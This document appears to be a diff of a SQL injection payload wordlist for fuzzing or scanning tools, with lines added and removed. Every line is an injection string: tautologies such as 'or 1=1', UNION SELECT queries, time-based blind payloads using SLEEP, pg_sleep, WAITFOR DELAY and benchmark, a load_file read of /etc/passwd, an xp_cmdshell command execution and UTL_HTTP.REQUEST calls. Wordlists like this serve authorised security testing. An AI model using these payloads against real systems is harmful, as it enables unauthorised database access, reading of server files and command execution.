-/**/or/**/1/**/=/**/1
-; or '1'='1'
 or 1=1
+or 1=1 or ""=
 or 1=1#
 or 1=1--
-or 1=1--
 or 1=1/*
- or 1=1 or ""=
- or 1=1 or ''='
-' or 1=1 or ''='
-or 1=1 or ""=
- or 1 in (select @@version)--
-or%201=1
-or%201=1 --
- or 2 > 1
- or 2 between 1 and 3
- or 3=3 --
- or 3=3
-' or 3=3
- or '7659'='7659
- or 'a'='a
- or a = a
- or a=a
- or a=a--
-" or "a"="a
-' or a=a--
-') or ('a'='a
-) or ('a'='a
-) or (a=a
+or SELECT SLEEP(5); #
+or SELECT pg_sleep(5);
+or SLEEP(5)
+or SLEEP(5)#
+or SLEEP(5)--
+or SLEEP(5)="
+or SLEEP(5)='
+or WAITFOR DELAY '0:0:5'
+or WAITFOR DELAY '0:0:5'--
 or a = a
 or a=a
- or benchmark(10000000,MD5(1))#
-" or benchmark(10000000,MD5(1))#
-") or benchmark(10000000,MD5(1))#
-")) or benchmark(10000000,MD5(1))#
-' or benchmark(10000000,MD5(1))#
-') or benchmark(10000000,MD5(1))#
-')) or benchmark(10000000,MD5(1))#
-) or benchmark(10000000,MD5(1))#
-)) or benchmark(10000000,MD5(1))#
-order by
- or (EXISTS)
-' or (EXISTS)
-" or isNULL(1/0) /*
+or benchmark(50000000,MD5(1))
+or benchmark(50000000,MD5(1))#
+or benchmark(50000000,MD5(1))--
 or isNULL(1/0) /*
- or pg_sleep(__TIME__)--
-" or pg_sleep(__TIME__)--
-") or pg_sleep(__TIME__)--
-")) or pg_sleep(__TIME__)--
-' or pg_sleep(__TIME__)--
-') or pg_sleep(__TIME__)--
-')) or pg_sleep(__TIME__)--
-) or pg_sleep(__TIME__)--
-)) or pg_sleep(__TIME__)--
- or sleep(__TIME__)#
- or sleep(__TIME__)='
-" or sleep(__TIME__)#
-" or sleep(__TIME__)="
-") or sleep(__TIME__)="
-")) or sleep(__TIME__)="
-' or sleep(__TIME__)#
-' or sleep(__TIME__)='
-') or sleep(__TIME__)='
-')) or sleep(__TIME__)='
-) or sleep(__TIME__)='
-)) or sleep(__TIME__)='
- or 'something' = 'some'+'thing'
- or 'text' = n'text'
- or 'text' > 't'
-" or true--
-") or true--
-' or true--
-') or true--
+or pg_SLEEP(5)
+or pg_SLEEP(5)#
+or pg_SLEEP(5)--
+or sleep 5
+or sleep 5--
+or sleep(5)
+or sleep(5)--
 or true--
-' or uid like '%
-' or uname like '%
- or 'unusual' = 'unusual'
-' or userid like '%
-' or user like '%
-' or username like '%
- or username like char(37);
- or 'whatever' in ('whatever')
-" or "x"="x
-") or ("x")=("x
-")) or (("x"))=(("x
-' or 'x'='x
-') or ('x')=('x
-')) or (('x'))=(('x
- -- &password=
+or%201=1
+or%201=1 --
+order by
 password:*/=1--
+pg_SLEEP(5)
+pg_SLEEP(5)#
+pg_SLEEP(5)--
+pg_sleep(5)--
 pg_sleep(__TIME__)--
-PRINT
-PRINT @@variable
 procedure
 replace
 select
- select * from information_schema.tables--
- select name from syscolumns where id = (sele ...
- (select top 1
-' (select top 1
+sleep(5)#
 sleep(__TIME__)#
---sp_password
-'sqlattempt1
-(sqlattempt2)
-(sqlvuln)
-+sqlvuln
 sqlvuln
 sqlvuln;
 t'exec master..xp_cmdshell 'nslookup www.googl ...
@@ -324,35 +706,22 @@ t'exec master..xp_cmdshell 'nslookup www.google.com'--
 to_timestamp_tz
 truncate
 tz_offset
- UNION ALL SELECT
-' UNION ALL SELECT
- union all select @@version--
- union select
 uni/**/on sel/**/ect
- UNION SELECT
-' UNION SELECT
- union select 1,load_file('/etc/passwd'),1,1,1;
-) union select * from information_schema.tables;
- union select * from users where login = char ...
 update
-'||UTL_HTTP.REQUEST
-||UTL_HTTP.REQUEST
-,@variable
-@variable
-@var select @var as var into temp end --
-"));waitfor delay '0:0:__TIME__'--
-");waitfor delay '0:0:__TIME__'--
-";waitfor delay '0:0:__TIME__'--
-'));waitfor delay '0:0:__TIME__'--
-');waitfor delay '0:0:__TIME__'--
-';waitfor delay '0:0:__TIME__'--
-));waitfor delay '0:0:__TIME__'--
-);waitfor delay '0:0:__TIME__'--
-;waitfor delay '0:0:__TIME__'--
-\x27UNION SELECT
 x' AND 1=(SELECT COUNT(*) FROM tabname); --
 x' AND email IS NULL; --
 x' AND members.email IS NULL; --
 x' AND userid IS NULL; --
-x' or 1=1 or 'x'='y
 x' OR full_name LIKE '%Bob%
+x' or 1=1 or 'x'='y
+|
+||
+||'6
+||(SELECT 0x57556971 FROM DUAL WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))||
+||(SELECT 0x67664847 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))||
+||(elt(-3+5,bin(15),ord(10),hex(char(45))))
+||6
+||UTL_HTTP.REQUEST
+Ã½ or 1=1 --
+â or 1=1 --
+â or 3=3 --
